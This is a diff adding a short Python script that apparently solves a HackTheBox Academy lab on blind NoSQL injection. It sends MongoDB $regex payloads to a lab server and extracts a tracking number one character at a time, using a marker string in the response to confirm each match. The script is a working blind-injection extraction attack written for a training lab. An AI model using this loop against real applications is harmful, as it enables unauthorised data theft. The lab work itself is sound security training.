@@ -1,0 +1,36 @@
+#!/usr/bin/env python3
+
+# Created this script to solve the HackTheBox Academy lab called 'Automating Blind Data Extraction' for the module called 'NoSQL Injections'. 
+
+import requests
+import string
+
+target="94.237.54.42:55412"
+proxies= {"http":"http://127.0.0.1:8080"}
+headers= {"Content-type":"appliction/json"}
+
+def nosqli():
+    tracking_number=""
+    list=string.printable
+    list= list.replace("*","").replace(".","").replace("+","").replace("?","").replace("$","")
+    count=0
+    while count < 99:
+        for char in list:
+            data=f'{{"trackingNum":{{"$regex":"^{tracking_number}{char}.*$"}}}}'
+            response= requests.post(url=f"http://{target}/index.php", proxies=proxies, headers=headers, verify=False, allow_redirects=True, data=data) 
+
+            if "bmdyy" in response.text:
+                char= str(char)
+                tracking_number+=char
+                print(tracking_number)
+                count=0
+                break
+            else:
+                count+=1
+                pass
+    print(tracking_number)
+    
+try:
+    nosqli()
+except KeyboardInterrupt:
+    print("Ctrl + C detected, exiting gracefully")
